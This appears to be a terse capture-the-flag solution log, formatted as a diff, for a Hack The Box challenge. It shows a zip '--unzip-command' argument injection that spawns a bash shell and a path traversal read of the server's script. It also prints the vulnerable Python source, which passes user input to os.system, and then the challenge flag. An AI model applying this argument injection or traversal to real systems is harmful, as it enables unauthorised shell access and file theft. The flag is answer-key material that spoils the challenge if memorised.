@@ -1,0 +1,136 @@
+linux@ubuntu:~$ zip aa.zip 969647046787231764 -v -T --unzip-command="sh -c /bin/bash"
+  adding: 969647046787231764    (in=8340) (out=3346) (deflated 60%)
+total bytes=8340, compressed=3346 -> 60% savings
+linux@ubuntu:~$ exit
+exit
+test of aa.zip OK
+
+-v -T --unzip-command="python3 -c "print('A')""
+python3 -c "print('A')"
+
+
+
+Insert name you want to read: ../../artifacts.py
+#!/usr/bin/python3
+import os, random
+from termcolor import colored
+
+
+whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.'#/ "
+PATH = "./"
+sub_array = ["Head", "Torso", "Hands", "Legs"]
+
+# Create random directory
+def rand_dirname(length=32):
+    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    dirname = ""
+    while len(dirname) < length:
+        dirname += random.choice(charset)
+    return dirname
+
+def check_filename(filename):
+    return all(i in whitelist for i in filename)
+
+def change_sub_dir(idx, color):
+  print(colored(f"\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\n", color))
+  os.chdir(PATH + sub_array[idx])
+
+def subjects():
+  subs = """\nComponent List:
+
++===============+
+|               |
+|  1. Head  🤖  |
+|  2. Torso 🦴   |
+|  3. Hands 💪  |
+|  4. Legs  🦵   |
+|               |
++===============+
+  """
+  print(colored(subs, "magenta"))
+  ans = int(input(colored("[*] Choose component: ", "magenta")))
+
+  if ans == 1:
+    change_sub_dir(0, "blue")
+  elif ans == 2:
+    change_sub_dir(1, "green")
+  elif ans == 3:
+    change_sub_dir(2, "cyan")
+  elif ans == 4:
+    change_sub_dir(3, "yellow")
+  else:
+    print(colored("\n[-] Invalid option!\n", "red"))
+    exit()
+
+def menu():
+  m = """
+Actions:
+
+1. Create artifact
+2. List directory    (pwd; ls -la)
+3. Read artifact     (cat ./<name>)
+4. Compress artifact (zip <name>.zip <name> <options>)
+5. Change directory  (cd <dirname>)
+6. Clean directory   (rm -rf ./*)
+7. Exit
+  """
+  print(colored(m, "yellow"))
+  return int(input(colored("[*] Choose action: ", "yellow")))
+
+def create_file():
+  fname = input(colored("Insert name: ", "yellow")).strip()
+  if not check_filename(fname):
+    print(colored("\n[-] Invalid name!\n", "red"))
+    exit()
+  os.system(f"touch {fname}")
+  contents = input(colored("\nInsert content: ", "yellow"))
+  f = open(fname, "a")
+  f.write(contents)
+  f.close()
+  print("\n")
+  print(colored(f"[+] Artifact [{fname}] was created successfuly!", "green"))
+
+def zip():
+  zip_name = input(colored("Insert <name>.zip: ", "blue")).strip()
+  files    = input(colored("Insert <name>: ", "blue")).strip()
+  options  = input(colored("Insert <options>: ", "blue")).strip()
+  if not check_filename(zip_name) or not check_filename(files) or not check_filename(options):
+    print(colored("\n[-] Invalid name!\n", "red"))
+    exit()
+  os.system(f"zip {zip_name}.zip {files} {options}")
+
+# Create directory
+dirname = rand_dirname()
+print(colored(f"\n[*] Directory to work in: {dirname}", "cyan"))
+os.mkdir(PATH + dirname)
+os.chdir(PATH + dirname)
+os.system("mkdir -p Head Torso Hands Legs")
+
+ans = subjects()
+
+while True:
+
+  # Choose action
+  act = menu()
+  print("\n")
+  if act == 1:
+    create_file()
+  elif act == 4:
+    zip()
+  elif act == 3:
+    fname = input("Insert name you want to read: ").strip()
+    os.system(f"cat ./{fname}")
+  elif act == 2:
+    os.system("pwd; ls -la")
+  elif act == 6:
+    os.system("rm -rf ./*")
+  elif act == 5:
+    os.chdir(f"../../{dirname}")
+    ans = subjects()
+  else:
+    print(colored("\n[-] Invalid option!\n", "red"))
+    os.system("rm -rf ./*")
+    exit()
+
+Insert name you want to read: ../../flag.txt
+HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
